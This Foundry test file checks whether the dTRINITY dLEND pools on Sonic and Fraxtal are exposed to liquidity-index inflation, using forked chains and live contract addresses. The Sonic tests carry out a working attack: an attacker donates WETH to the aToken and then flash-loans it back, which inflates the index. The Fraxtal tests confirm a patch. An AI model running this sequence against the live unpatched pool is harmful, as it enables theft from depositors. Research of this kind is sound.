// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IPool, IFlashLoanSimpleReceiver, IWETH} from "../src/interfaces.sol";

/// @notice Flash-loan receiver that simply repays amount+premium.
contract Receiver is IFlashLoanSimpleReceiver {
    address public immutable pool;
    constructor(address p) { pool = p; }
    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata) external returns (bool) {
        IERC20(asset).approve(pool, amount + premium);
        return true;
    }
    receive() external payable {}
}

/// @title dTRINITY dLEND — liquidity-index inflation: live-gating + patch verification
/// Read-only research. Fork simulations only; no live-chain transactions.
contract DtrinityDLendTest is Test {
    // ---- Sonic (chain 146) ----
    address constant SONIC_POOL   = 0xEdC3cfB1aa36c570cc1D374876268bDda2D460CC;
    address constant SONIC_WETH   = 0x50c42dEAcD8Fc9773493ED674b675bE577f2634b;
    address constant SONIC_WETH_ATOKEN = 0x8d9D88151c09CcFd53Ae1162176eE34677142328;
    address constant SONIC_DUSD   = 0x53a6aBb52B2F968fA80dF6A894e4f1b1020DA975;
    address constant SONIC_WSTKSCUSD = 0x9fb76f7ce5FCeAA2C42887ff441D46095E494206;

    // ---- Fraxtal (chain 252) ----
    address constant FRAX_POOL    = 0xD76C827Ee2Ce1E37c37Fc2ce91376812d3c9BCE2;
    address constant FRAX_SUSDE   = 0x211Cc4DD073734dA055fbF44a2b4667d5E5fE5d2; // unfrozen, flash disabled
    address constant FRAX_USDE    = 0x5d3a1Ff2b6BAb83b63cd9AD0787074081a52ef34; // near-empty, frozen, flash disabled
    address constant FRAX_USDE_ATOKEN = 0x6AE1450D550e44Bb014D4c8CD98592863edB0706;
    address constant FRAX_SCRVUSD = 0xaB94C721040b33aA8b0b4D159Da9878e2a836Ed0; // frozen, flash enabled

    address attacker = address(0xA11CE);
    Receiver sonicRecv;
    Receiver fraxRecv;

    // reserve-config storage slot: _reserves (slot 0) mapping base
    function cfgSlot(address asset) internal pure returns (bytes32) {
        return keccak256(abi.encode(asset, uint256(0)));
    }
    function readCfg(address pool, address asset) internal view returns (uint256) {
        return uint256(vm.load(pool, cfgSlot(asset)));
    }
    function clearBit(address pool, address asset, uint8 bit) internal {
        bytes32 s = cfgSlot(asset);
        uint256 c = uint256(vm.load(pool, s));
        c &= ~(uint256(1) << bit);
        vm.store(pool, s, bytes32(c));
    }
    function setBit(address pool, address asset, uint8 bit) internal {
        bytes32 s = cfgSlot(asset);
        uint256 c = uint256(vm.load(pool, s));
        c |= (uint256(1) << bit);
        vm.store(pool, s, bytes32(c));
    }

    function sonicRpc() internal view returns (string memory) {
        string memory u = vm.envOr("SONIC_RPC_URL", string(""));
        return bytes(u).length == 0 ? "https://sonic-rpc.publicnode.com" : u;
    }
    function fraxRpc() internal view returns (string memory) {
        string memory u = vm.envOr("FRAXTAL_RPC_URL", string(""));
        return bytes(u).length == 0 ? "https://rpc.frax.com" : u;
    }

    function errStr(string memory code) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("Error(string)", code);
    }

    /* ============================ SONIC ============================ */

    function test_sonic_supply_blocked_frozen() public {
        vm.createSelectFork(sonicRpc());
        console2.log("SONIC block", block.number);
        vm.prank(attacker);
        vm.expectRevert(errStr("28")); // RESERVE_FROZEN
        IPool(SONIC_POOL).supply(SONIC_WSTKSCUSD, 1, attacker, 0);
    }

    function test_sonic_borrow_blocked_frozen() public {
        vm.createSelectFork(sonicRpc());
        vm.prank(attacker);
        vm.expectRevert(errStr("28")); // RESERVE_FROZEN
        IPool(SONIC_POOL).borrow(SONIC_DUSD, 1, 2, 0, attacker);
    }

    /// Flash loans remain open on frozen Sonic reserves (frozen is NOT checked by validateFlashloanSimple).
    function test_sonic_flashloan_open() public {
        vm.createSelectFork(sonicRpc());
        sonicRecv = new Receiver(SONIC_POOL);
        uint256 amount = 1; // 1 wei WETH -> premium rounds to 0
        IPool(SONIC_POOL).flashLoanSimple(address(sonicRecv), SONIC_WETH, amount, "", 0);
        assertTrue(true, "flashLoanSimple on frozen Sonic reserve did not revert");
        console2.log("SONIC flashLoanSimple on frozen WETH: SUCCESS (flash path open)");
    }

    /// POSITIVE: Sonic impl is UNPATCHED -> flash-loan premium inflates the liquidity index.
    /// (Simulates a thin market by donating WETH to the aToken; no supply needed for the flash path.)
    function test_sonic_unpatched_index_inflates() public {
        vm.createSelectFork(sonicRpc());
        sonicRecv = new Receiver(SONIC_POOL);

        uint256 idxBefore = IPool(SONIC_POOL).getReserveNormalizedIncome(SONIC_WETH);
        uint256 cashBefore = IERC20(SONIC_WETH).balanceOf(SONIC_WETH_ATOKEN);
        console2.log("SONIC WETH index before", idxBefore);
        console2.log("SONIC WETH aToken cash before", cashBefore);

        // donate WETH directly to the aToken (permissionless ERC20 transfer) -> cash >> scaled supply
        uint256 donation = 100e18;
        deal(SONIC_WETH, attacker, donation);
        vm.prank(attacker);
        IERC20(SONIC_WETH).transfer(SONIC_WETH_ATOKEN, donation);

        // flash-loan the donated liquidity; premium = 5 bps
        uint256 flashAmt = 100e18;
        uint256 premium = flashAmt * uint256(IPool(SONIC_POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
        deal(SONIC_WETH, address(sonicRecv), premium); // cover premium
        IPool(SONIC_POOL).flashLoanSimple(address(sonicRecv), SONIC_WETH, flashAmt, "", 0);

        uint256 idxAfter = IPool(SONIC_POOL).getReserveNormalizedIncome(SONIC_WETH);
        console2.log("SONIC WETH index after ", idxAfter);
        console2.log("SONIC premium (wei)", premium);
        // no block advance => interest accrual is 0; any increase is the (unpatched) premium accrual
        assertGt(idxAfter, idxBefore, "index must inflate on UNPATCHED Sonic impl");
        emit log_named_uint("SONIC index multiple x1000", idxAfter * 1000 / idxBefore);
    }

    /* ============================ FRAXTAL ============================ */

    function test_fraxtal_flashloan_disabled_on_unfrozen_reserve() public {
        vm.createSelectFork(fraxRpc());
        console2.log("FRAXTAL block", block.number);
        fraxRecv = new Receiver(FRAX_POOL);
        vm.expectRevert(errStr("91")); // FLASHLOAN_DISABLED
        IPool(FRAX_POOL).flashLoanSimple(address(fraxRecv), FRAX_SUSDE, 1e18, "", 0);
    }

    function test_fraxtal_supply_blocked_on_frozen_reserve() public {
        vm.createSelectFork(fraxRpc());
        vm.prank(attacker);
        vm.expectRevert(errStr("28")); // RESERVE_FROZEN
        IPool(FRAX_POOL).supply(FRAX_SCRVUSD, 1, attacker, 0);
    }

    /// NEGATIVE (patch proof): Fraxtal impl routes the FULL premium to treasury and never calls
    /// cumulateToLiquidityIndex, so the flash-loan premium CANNOT inflate the index.
    /// We force the flash-loan path open on a thin reserve via a storage override to isolate the code.
    function test_fraxtal_patched_no_index_inflation() public {
        vm.createSelectFork(fraxRpc());
        fraxRecv = new Receiver(FRAX_POOL);

        // force flash-loan bit on (bit 63) on the thin USDe reserve
        setBit(FRAX_POOL, FRAX_USDE, 63);

        uint256 idxBefore = IPool(FRAX_POOL).getReserveNormalizedIncome(FRAX_USDE);
        console2.log("FRAX USDe index before", idxBefore);

        uint256 donation = 100e18;
        deal(FRAX_USDE, attacker, donation);
        vm.prank(attacker);
        IERC20(FRAX_USDE).transfer(FRAX_USDE_ATOKEN, donation);

        uint256 flashAmt = 100e18;
        uint256 premium = flashAmt * uint256(IPool(FRAX_POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
        deal(FRAX_USDE, address(fraxRecv), premium);
        IPool(FRAX_POOL).flashLoanSimple(address(fraxRecv), FRAX_USDE, flashAmt, "", 0);

        uint256 idxAfter = IPool(FRAX_POOL).getReserveNormalizedIncome(FRAX_USDE);
        console2.log("FRAX USDe index after ", idxAfter);
        console2.log("FRAX premium (wei)", premium);
        assertEq(idxAfter, idxBefore, "PATCHED Fraxtal impl: index must NOT move on flash-loan premium");
        console2.log("FRAX patched: index unchanged -> patch confirmed");
    }
}
